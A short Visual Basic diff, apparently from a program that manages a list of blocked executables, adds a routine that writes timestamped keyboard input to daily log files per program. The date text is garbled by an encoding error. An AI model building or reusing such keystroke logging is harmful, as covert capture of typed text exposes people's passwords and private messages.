@@ -92,6 +92,13 @@ BreakExe:
     Next
 End Sub
 
+Sub CarryKeyBoard(Str As String)
+    If img = "" Then Exit Sub
+    Open DataPath & "\Logs\Keyboard\" & img & " - " & year(Now) & "Äê" & Month(Now) & "ÔÂ" & Day(Now) & "ÈÕ.txt" For Append As #1
+    Print #1, Now & "    " & Str
+    Close #1
+End Sub
+
 Private Sub Class_Initialize()
     If Dir(DataPath & "\break.db") = "" Then
         ReDim Breaks.List(0)
